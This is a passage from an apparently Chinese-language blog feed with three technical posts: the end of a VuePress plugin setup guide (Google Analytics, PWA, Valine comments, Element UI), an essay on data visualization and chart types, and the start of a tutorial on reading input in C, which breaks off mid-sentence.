class="line">3</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  plugins: [&#x27;@vuepress/medium-zoom&#x27;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3 效果图</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200427075157.gif"></p><h3 id="配置-Google-Analytics"><a href="#配置-Google-Analytics" class="headerlink" title="配置 Google Analytics"></a>配置 Google Analytics</h3><p>网站搭建好了，也有人访问了，那我们要怎么统计用户的访问情况呢？可以使用谷歌出品的 Google Analytics （GA）。</p><p>Google Analytics （GA）是一个对用户活动进行追踪的工具，利用 GA 我们可以收集到博客当前有多少实时活跃用户，博客的总访问量，以及分析用户的一些访问行为，便于我们对博客网站做一些优化，而且它还是免费的！赶快用起来！</p><p>1 下载 google-analytics 插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yarn add -D @vuepress/plugin-google-analytics</span><br><span class="line"># OR npm install -D @vuepress/plugin-google-analytics</span><br></pre></td></tr></table></figure><p>安装完在 config 配置文件里面配置一下 plugins</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    [</span><br><span class="line">      &#x27;@vuepress/google-analytics&#x27;,</span><br><span class="line">      &#123;</span><br><span class="line">        &#x27;ga&#x27;: &#x27;&#x27; // UA-00000000-0</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2 注册 GA，获取追踪 ID</p><p>上面那个 ga ID从哪里获取呢？别着急，我们需要到 <a href="https://analytics.google.com/">Google Analytics</a> 的官网上去注册一下我们的博客应用：</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200427080400.png" alt="image-20200427080359014" title="image-20200427080359014"></p><p>创建账号：</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200427080426.png" alt="image-20200427080425558" title="image-20200427080425558"></p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200427080513.png" alt="image-20200427080511842" title="image-20200427080511842"></p><p>根据实际情况设置：</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200427080635.png" alt="image-20200427080634915" title="image-20200427080634915"></p><p>然后就会获得追踪 ID，</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200427080745.png" alt="image-20200427080744798" title="image-20200427080744798"></p><p>把获取到的跟踪ID 填到上面?的<code>ga</code>这一项里面就好了。</p><h3 id="插件-PWA"><a href="#插件-PWA" class="headerlink" title="插件-PWA"></a>插件-PWA</h3><p>1 安装插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yarn add -D @vuepress/plugin-pwa</span><br><span class="line"># OR npm install -D @vuepress/plugin-pwa</span><br></pre></td></tr></table></figure><p>2 添加插件信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//config,js</span><br><span class="line">module.exports = &#123;</span><br><span class="line">// ...</span><br><span class="line"> plugins: [</span><br><span class="line">    [&#x27;@vuepress/pwa&#x27;, &#123;</span><br><span class="line">        serviceWorker: true,</span><br><span class="line">        //指向自定义组件</span><br><span class="line">        popupComponent: &#x27;MySWUpdatePopup&#x27;,</span><br><span class="line">        updatePopup: &#123;</span><br><span class="line">            message: &quot;新的风暴已经出现&quot;,</span><br><span class="line">            buttonText: &quot;盘他&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;]</span><br><span class="line"> ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>serviceWorker 的作用大致就页面首次加载时会请求本地的serviceWorker.js 去比对各个文件的版本号<br>如果不一致则提示用户拉取更新</p><h3 id="评论系统-Valine"><a href="#评论系统-Valine" class="headerlink" title="评论系统-Valine"></a>评论系统-Valine</h3><h4 id="方案一：valine-官方插件"><a href="#方案一：valine-官方插件" class="headerlink" title="方案一：valine 官方插件"></a>方案一：valine 官方插件</h4><p>参考：<a href="https://valine.js.org/vuepress.html">valine 官方安装教程</a></p><ul><li>获取APP ID 和 APP Key,请先登录或注册 <strong>LeanCloud</strong>, 进入控制台后点击左下角创建应用</li><li>安装并使用 <strong>Valine</strong></li></ul><p>1 安装插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save vuepress-plugin-comment</span><br></pre></td></tr></table></figure><p>2 将 <code>vuepress-plugin-comment</code> 添加到vuepress项目的插件配置中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    [</span><br><span class="line">      &#x27;vuepress-plugin-comment&#x27;,</span><br><span class="line">      &#123;</span><br><span class="line">        choosen: &#x27;valine&#x27;, </span><br><span class="line">        // options选项中的所有参数，会传给Valine的配置</span><br><span class="line">        options: &#123;</span><br><span class="line">          el: &#x27;#valine-vuepress-comment&#x27;,</span><br><span class="line">          appId: &#x27;Your own appId&#x27;,</span><br><span class="line">          appKey: &#x27;Your own appKey&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3 效果</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200427133744.png" alt="image-20200427133728810" title="image-20200427133728810"></p><p>4 修改样式</p><p>创建 .vuepress&#x2F;styles&#x2F;palette.styl</p><p>写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#valine-vuepress-comment .veditor &#123;</span><br><span class="line">  min-height: 10rem;</span><br><span class="line">  background-image: url(https://cos.gjcloak.xyz/CS-Notes/20200425091751.png);</span><br><span class="line">  background-size: contain;</span><br><span class="line">  background-repeat: no-repeat;</span><br><span class="line">  background-position: right;</span><br><span class="line">  background-color: rgba(255,255,255,0);</span><br><span class="line">  resize: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.vat &#123;</span><br><span class="line">  color: #49B1F5 !important;</span><br><span class="line">  font-size: 14px !important;</span><br><span class="line">&#125;</span><br><span class="line">.vpower.txt-right &#123;</span><br><span class="line">  display: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#valine-vuepress-comment &#123;</span><br><span class="line">  max-width 740px</span><br><span class="line">  padding 10px</span><br><span class="line">  display block;</span><br><span class="line">  margin-left auto;</span><br><span class="line">  margin-right auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>config.js 中写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const path = require(&#x27;path&#x27;)</span><br><span class="line">palette: path.resolve(__dirname, &#x27;palette.styl&#x27;),//样式修改</span><br></pre></td></tr></table></figure><p>5 效果图</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200428090123.png" alt="image-20200428090051466" title="image-20200428090051466"></p><blockquote><p>建议使用方案一，方案二需要进行优化，因为 Valine 部分是被当作内容处理的，但是如果你非要使用方案二，可以把解决方案和我分享喔！</p></blockquote><h4 id="方案二：配合插件手写全局组件"><a href="#方案二：配合插件手写全局组件" class="headerlink" title="方案二：配合插件手写全局组件"></a>方案二：配合插件手写全局组件</h4><p>1 安装 Valine</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//Install leancloud&#x27;s js-sdk</span><br><span class="line">npm install leancloud-storage --save</span><br><span class="line"></span><br><span class="line">//Install valine</span><br><span class="line">npm install valine --save</span><br></pre></td></tr></table></figure><p>2 注册 vuepress 全局组件</p><p>创建 .vuepress&#x2F;components&#x2F;Valine.vue</p><p>(在components下注册的 vue 可供全局使用，文件名为组件名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;div id=&quot;vcomments&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &#x27;Valine&#x27;,</span><br><span class="line">        mounted: function()&#123;</span><br><span class="line">            // require window</span><br><span class="line">            const Valine = require(&#x27;valine&#x27;);</span><br><span class="line">            if (typeof window !== &#x27;undefined&#x27;) &#123;</span><br><span class="line">                this.window = window</span><br><span class="line">                window.AV = require(&#x27;leancloud-storage&#x27;)</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            new Valine(&#123;</span><br><span class="line">                el: &#x27;#vcomments&#x27; ,</span><br><span class="line">                appId: &quot;KIlqXsCmzBUnovnvh5ih8mk9-gzGzoHsz&quot;,</span><br><span class="line">                appKey: &quot;e0v6zIg2NGg44PM6MVLa7voo&quot;,</span><br><span class="line">                notify:false,</span><br><span class="line">                verify:false,</span><br><span class="line">                avatar: &#x27;monsterid&#x27;,</span><br><span class="line">                placeholder: &quot;你是我一生只会遇见一次的惊喜 ...&quot;,</span><br><span class="line">                path:window.location.pathname,//配置path地址，否则评论混乱</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    #vcomments&#123;</span><br><span class="line">        margin-top:100px;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>3 使用 Valine</p><p>只需要在 markdown 中调用即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Valine&gt;&lt;/Valine&gt;</span><br></pre></td></tr></table></figure><p>4 效果</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200427134950.png" alt="image-20200427134948583" title="image-20200427134948583"></p><p>也不错，只是评论被当作内容处理了……</p><h3 id="不蒜子访问量统计功能"><a href="#不蒜子访问量统计功能" class="headerlink" title="不蒜子访问量统计功能"></a>不蒜子访问量统计功能</h3><p>1 安装插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yarn add busuanzi.pure.js</span><br><span class="line"># or</span><br><span class="line">npm install busuanzi.pure.js --save</span><br></pre></td></tr></table></figure><blockquote><p>还未实现，待完善</p></blockquote><h2 id="集成-UI-组件"><a href="#集成-UI-组件" class="headerlink" title="集成 UI 组件"></a>集成 UI 组件</h2><p>vuepress 支持扩展，支持引入第三方组件，在 .vuepress&#x2F; 下创建 enhanceApp.js 文件，这里展示的是引入 vue 生态圈比较知名的ui库 <a href="https://element.eleme.cn/#/zh-CN">Element</a>, 来自于饿了么。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 扩展 VuePress 应用</span><br><span class="line"> */</span><br><span class="line">import Element from &#x27;element-ui&#x27;</span><br><span class="line">import &#x27;element-ui/lib/theme-chalk/index.css&#x27;</span><br><span class="line"></span><br><span class="line">export default (&#123;</span><br><span class="line">  Vue, </span><br><span class="line">&#125;) =&gt; &#123;</span><br><span class="line">  // ...做一些其他的应用级别的优化</span><br><span class="line">  Vue.use(Element)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，在这之前，需要先安装 element。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yarn add element-ui</span><br><span class="line"># or </span><br><span class="line">npm install element-ui --save</span><br></pre></td></tr></table></figure><p>在扩展之后，就可以在自定义的组件或者 md 文件中，使用 element 的组件了。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态博客 </tag>
            
            <tag> VuePress </tag>
            
            <tag> 文档 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据可视化的通用逻辑</title>
      <link href="/57.html"/>
      <url>/57.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>数据可视化，就仅仅只是把数据转换成图形吗？其实不然，一个好的数据可视化，不仅能带来视觉上的冲击，还能揭示蕴含在数据中的规律和道理，一起来看一下吧。</p></blockquote><p>有人说，数据可视化不就是画图嘛，看不出来研究的价值在哪。我原来也天真的以为，数据可视化就是把数据从冰冷的数字转换成图形，顶多就是色彩丰富一些，看起来更酷炫，逼格满满。其实不然，一个好的可视化，能够带给人们不仅仅是视觉上的冲击，还能够揭示蕴含在数据中的规律和道理。</p><h1 id="可视化是什么"><a href="#可视化是什么" class="headerlink" title="可视化是什么"></a>可视化是什么</h1><p>数据可视化（Data Visualization）和信息可视化（Infographics）是两个相近的专业领域名词，而我们通常会将数据可视化概括为，对一些数据和抽象概念或者文字信息的图表呈现和信息传递的表达方式。</p><p>其实，世界都是由真实的数据组成的，抽象化地反映了我们日常的生活，在面对数据可视化设计的时候，我们设计师的目的就是将杂乱无章、冗余的数据整合、分析，经过视觉化映射处理，转化为一眼可得，被用户理解感知的简单美观的信息图表。</p><p>简单来讲，可视化设计的实质就是让数据说话，一个好的可视化设计必须是有逻辑、美观、简单的。那么，我们设计师如何才能做好数据可视化呢？</p><h1 id="从三个角度去看数据可视化"><a href="#从三个角度去看数据可视化" class="headerlink" title="从三个角度去看数据可视化"></a>从三个角度去看数据可视化</h1><p>系统开发中常见的数据报表统计，将数据用图表或表格的形式呈现出来，帮助运营或者决策人员了解这些数据的规律或者价值，就是简单的可视化应用。</p><p>从开发角度来看，把系统中的核心数据，用一定的手段进行统计，在借助一些精美的图表样式，展示出来，或者把一系列图表组装成一个数据大屏，格调十足。</p><p>从运营人员的角度看，更多的是借助可视化数据分析业务场景，得到有价值的参考数据，为后续的决策或者开展活动提供指导。所以随着业务线的不断发展，对数据分析的要求越来越高，也就诞生了数据分析师。</p><h1 id="怎么做数据可视化"><a href="#怎么做数据可视化" class="headerlink" title="怎么做数据可视化"></a>怎么做数据可视化</h1><p>能够完成数据可视化的工具有很多，目前主流使用的有两种，分别是个人用户较多的可视化工具以及企业客户偏多的商业智能BI工具。</p><p>可视化工具的优点就是更加的轻量化，甚至可以直接通过在线网页完成简单图表的制作，但一般只能通过手动输入数据的方式制作，也会有各种限制，比如水印、限制组件、设置上限等等。</p><p><img src="https://cos.gjcloak.xyz/file/image-1652496563362.png" alt="image-1652496563362"></p><h2 id="确认需求"><a href="#确认需求" class="headerlink" title="确认需求"></a>确认需求</h2><p>数据可视化是为了解决问题而制作出来的，所以实际制作分析的过程中必须紧贴企业业务流程，了解业务指标、属于什么专业方向的内容，最大程度地提升数据分析的准确性，提高图表展现信息的质量。</p><p>接到数据可视化需求之后，我们必须要先清楚图表制作完成后受众对象是谁，对项目做一个初步的规划方案，把需求对象要解决的问题、想要看到的信息以及关键点摸清。</p><p>如果可以，最好再和需求对象对接一下，确定规划没有问题，这里一定要重视，规划的数据方向如果不是对方想要的，那时候的努力只是在浪费自己的时间精力，甚至有可能被要求推倒重来。</p><h2 id="准备数据"><a href="#准备数据" class="headerlink" title="准备数据"></a>准备数据</h2><p>数据可视化，千万不能忘了数据。不管前期规划再好，业务指标和需求之间的关系再贴合，没有数据你什么也分析不了。</p><p><img src="https://cos.gjcloak.xyz/file/image-1652496602578.png" alt="image-1652496602578"></p><p>数据决定了你图表可以展现的信息，也决定了你要进行的分析流程，所以一定要提前到数据仓库中查看是否有自己需要的业务数据。如果没有就要及时寻找，看看对方是否能够临时填报、补录数据，增加数据的源头。</p><p>下一步就要把这些确认好的数据跟之前规划的指标核对，将这些不同数据进行关联，思考数据分析中可能会使用到的关键信息，把整理过的数据放到备用表单中。</p><h2 id="选择图表"><a href="#选择图表" class="headerlink" title="选择图表"></a>选择图表</h2><p>图表的选择直接关系到可视化的呈现效果，一个合适的图表能够把数据之间的联系转化为直观的信息，相反错误的图表可能会将需求对象引向错误的方向。</p><p>数据可视化分析人员必须了解所有主流的图表类型，知道每个图表适合做哪些分析，能够展现哪种类型的信息，举个例子，折线图、柱形图等能够轻易地展现事物的发展趋势，但如果你把某段时间销售数量变化趋势呈现在饼图上，那这个图表就没有任何意义了。</p><h2 id="数据可视化分析"><a href="#数据可视化分析" class="headerlink" title="数据可视化分析"></a>数据可视化分析</h2><p>在数据分析过程中，很多新手会有一个误区，经常会把各种各样的可视化图表装满几个屏幕，认为这样就可以把所有信息直观的展示给用户。</p><p>实际上，用户并不需要那么多内容，相比复杂的信息展示，他们往往会更喜欢一目了然的内容设计，一眼就能看到关键信息。</p><p>此外，整个可视化图表页面中，色彩不宜太过丰富，颜色最好也不要太过鲜艳，把色彩对比强烈的颜色放到关键信息，用清晰的逻辑去呈现变化，突出重点部分，使用户产生更好的体验，这才是他们最希望看到的。</p><h1 id="数据可视化页面的关键要素"><a href="#数据可视化页面的关键要素" class="headerlink" title="数据可视化页面的关键要素"></a>数据可视化页面的关键要素</h1><ul><li>清晰：一个好的数据可视化界面一定是能够清晰地展现用户所需要的信息，当用户看到界面内容时，应该能在5秒内了解到它的用途，而不是花费至少几分钟才能理解各个数据的含义。</li><li>有意义：一个有用的数据可视化界面上的每一条信息都应该是有意义的，这些有意义的信息能准确传达设计师想要表达的内容。每一条数据的背后，用户应该都是可以读懂的。</li><li>一致性：优秀的数据可视化界面，会有一套非常严谨一致的版面。这里的一致性需要考虑到布局，结构和内容。</li><li>简单：复杂的界面违背了数据可视化设计的初衷，如果一个信息呈现不够简单直接，那么肯定是在设计上出现了问题。</li></ul><h1 id="几种常用的可视化图表"><a href="#几种常用的可视化图表" class="headerlink" title="几种常用的可视化图表"></a>几种常用的可视化图表</h1><h2 id="柱状图"><a href="#柱状图" class="headerlink" title="柱状图"></a>柱状图</h2><p>特点是可横向排列，或用多维方式表达。长条柱或柱组中线须对齐项目刻度，例如比较两个或以上的价值（不同时间或者不同条件），只有一个变量，通常利用于较小的数据集分析。</p><p><img src="https://cos.gjcloak.xyz/file/image-1652496696932.png" alt="image-1652496696932"></p><h2 id="漏斗图"><a href="#漏斗图" class="headerlink" title="漏斗图"></a>漏斗图</h2><p>特点是强调数据之间的转化关系和递进规律，经典常见就是用户浏览量，点击量，到订单支付数量。</p><p><img src="https://cos.gjcloak.xyz/file/image-1652496725640.png" alt="image-1652496725640"></p><h2 id="饼状图"><a href="#饼状图" class="headerlink" title="饼状图"></a>饼状图</h2><p>特点是不注重数据明细，强调数据中各项占总体的百分比，或者分布情况，注重模块模块之间的对比。</p><p><img src="https://cos.gjcloak.xyz/file/image-1652496742566.png" alt="image-1652496742566"></p><h2 id="条形图"><a href="#条形图" class="headerlink" title="条形图"></a>条形图</h2><p>特点是是统计图资料分析中最常用的图形能够使人们一眼看出各个数据的大小。</p><p>易于比较数据之间的差别。</p><p><img src="https://cos.gjcloak.xyz/file/image-1652496771702.png" alt="image-1652496771702"></p><h2 id="折线图"><a href="#折线图" class="headerlink" title="折线图"></a>折线图</h2><p>特点是是能看出数量的增减变化情况，以折线的上升或下降来表示统计数量的增减变化的统计图，折线统计图用折线的起伏表示数据的增减变化情况，不仅可以表示数量的多少，而且可以反映数据的增减变化情况和趋势。</p><p>应用场景：常用于描述指标在一段时间或有序类别内的表化趋势，并展现数据间的关联性。</p><p><img src="https://cos.gjcloak.xyz/file/image-1652496792424.png" alt="image-1652496792424"></p><h2 id="堆积面积图"><a href="#堆积面积图" class="headerlink" title="堆积面积图"></a>堆积面积图</h2><p>特点：强调数量随因变量变化的程度，以及变化的趋势。可设置辅助线、趋势线等辅助分析，添加标签、缩略轴等优化交互体验。</p><p><img src="https://cos.gjcloak.xyz/file/image-1652496812110.png" alt="image-1652496812110"></p><h2 id="K线图"><a href="#K线图" class="headerlink" title="K线图"></a>K线图</h2><p>用于记录数据变化趋势，及波动情况，常用于股票，体现价格走势与波动情况可在K线图下方设置一个柱状图，用于表示波动情况。</p><p><img src="https://cos.gjcloak.xyz/file/image-1652496833260.png" alt="image-1652496833260"></p><h2 id="桑葚图"><a href="#桑葚图" class="headerlink" title="桑葚图"></a>桑葚图</h2><p>桑基图用于描述一组数值转化成另一组数值的流向，观察数据的流转情况，始末数据量相等。图中的各个分支宽度表示流量的大小，线条粗细代表数据大小。桑基图主要应用于用户行为路径、能源流转等场景。</p><p><img src="https://cos.gjcloak.xyz/file/image-1652496856256.png" alt="image-1652496856256"></p><h2 id="旭日图"><a href="#旭日图" class="headerlink" title="旭日图"></a>旭日图</h2><p>清晰地表达层级和归属关系，以父子层次结构显示数据构成情况，旭日图能便于细分溯源分析数据，真正了解数据的具体构成。旭日图用于描述树状结构数据。</p><p><img src="https://cos.gjcloak.xyz/file/image-1652496883553.png" alt="image-1652496883553"></p><p>相信大家可以根据自身的需求来选择合适自己的图表。</p><h1 id="数据可视化技术的基本概念"><a href="#数据可视化技术的基本概念" class="headerlink" title="数据可视化技术的基本概念"></a>数据可视化技术的基本概念</h1><ul><li>数据空间：是由n维属性和m个元素组成的数据集所构成的多维信息空间</li><li>数据开发：是指利用一定的算法和工具对数据进行定量的推演和计算</li><li>数据分析：指对多维数据进行切片、块、旋转等动作剖析数据，从而能多角度多侧面观察数据</li><li>数据可视化：是指将大型数据集中的数据以图形图像形式表示，并利用数据分析和开发工具发现其中未知信息的处理过程。数据可视化已经提出了许多方法，这些方法根据其可视化的原理不同可以划分为基于几何的技术、面向像素技术、基于图标的技术、基于层次的技术、基于图像的技术和分布式技术等等</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>数据可视化是帮助人更好的分析数据，信息的质量很大程度上依赖于其表达方式。</p><p>对数字罗列所组成的数据中所包含的意义进行分析，使分析结果可视化。其实数据可视化的本质就是视觉对话。数据可视化将技术与艺术完美结合，借助图形化的手段，清晰有效地传达与沟通信息。</p><p>一方面，数据赋予可视化以价值；另一方面，可视化增加数据的灵性，两者相辅相成，帮助企业从信息中提取知识、从知识中收获价值。</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图表 </tag>
            
            <tag> 数据可视化 </tag>
            
            <tag> 逻辑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据输入的处理</title>
      <link href="/56.html"/>
      <url>/56.html</url>
      
        <content type="html"><![CDATA[<h2 id="C-语言版"><a href="#C-语言版" class="headerlink" title="C 语言版"></a>C 语言版</h2><h3 id="简单的输入一组数据"><a href="#简单的输入一组数据" class="headerlink" title="简单的输入一组数据"></a>简单的输入一组数据</h3><p>【Example Subject】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line">计算 a+b</span><br><span class="line"></span><br><span class="line">Input</span><br><span class="line">两个整数 a,b</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line">a+b的值</span><br><span class="line"></span><br><span class="line">Sample Input</span><br><span class="line">1 2</span><br><span class="line"></span><br><span class="line">Sample Output</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>这种简单输入，接受一组输入，针对这种输入计算出值即可。</p><p>【Method】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a,b;</span><br><span class="line">    scanf(&quot;%d %d&quot;,&amp;a, &amp;b);</span><br><span class="line">    printf(&quot;%d\n&quot;,a+b);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一次运行输入多组数据直到读至-EOF"><a href="#一次运行输入多组数据直到读至-EOF" class="headerlink" title="一次运行输入多组数据直到读至 EOF"></a>一次运行输入多组数据直到读至 EOF</h3><p>一次运行，要输入多组数据，直到读至输入文件末尾（EOF）为止</p><p>【Example Subject】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line">计算 a + b</span><br><span class="line"></span><br><span class="line">Input</span><br><span class="line">多组由两个整数（a和b）构成的输入，a和b之间用空格隔开,</span><br><span class="line">每组输入单独占一行 </span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line">每组的两个整数（a和b）求和并输出，每组的求和结果独占一行</span><br><span class="line"></span><br><span class="line">Sample Input</span><br><span class="line">1 5</span><br><span class="line">10 20</span><br><span class="line">400 516</span><br><span class="line"></span><br><span class="line">Sample Output</span><br><span class="line">6</span><br><span class="line">30</span><br><span class="line">916</span><br></pre></td></tr></table></figure><p>这种输入包含多对输入数据，需要构造一个循环读取。因为没有指出到底有多少对输入，要有办法判断输入何时结束。解决办法是：</p><p>【Method】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line">    int a,b;</span><br><span class="line">    while(scanf(&quot;%d %d&quot;,&amp;a, &amp;b) != EOF) </span><br><span class="line">    &#123;// 输入结束时，scanf函数返回值为EOF(-1)，即没有数据输入时会退出while循环</span><br><span class="line">        printf(&quot;%d\n&quot;,a+b);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注 1：scanf 函数返回值就是读出的变量个数，如果一个都没有，则返回值是 -1。EOF是一个预定义的常量，等于 -1。</p><p>注 2：在调试程序时，键盘输入的数据，用 